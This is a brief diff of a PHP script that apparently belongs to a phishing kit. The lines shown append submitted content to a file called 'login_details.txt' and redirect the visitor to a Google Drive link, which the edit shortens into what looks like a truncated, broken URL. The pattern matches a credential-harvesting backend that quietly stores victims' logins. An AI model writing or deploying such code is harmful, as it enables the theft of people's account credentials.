@@ -30,7 +30,7 @@ $file_handle = fopen('login_details.txt', 'a');
 fwrite($file_handle, $content);
 fclose($file_handle);
 
-$redirect_url = 'https://drive.google.com/file/d/1cMnZlVOcVV02Usi9P7NRa45gXBh-ABpX/view?usp=sharing';
+$redirect_url = 'https://drive.google.com/file/d/1cMnZlVOcVV02';
 header("Location: ".$redirect_url);
 exit();
 
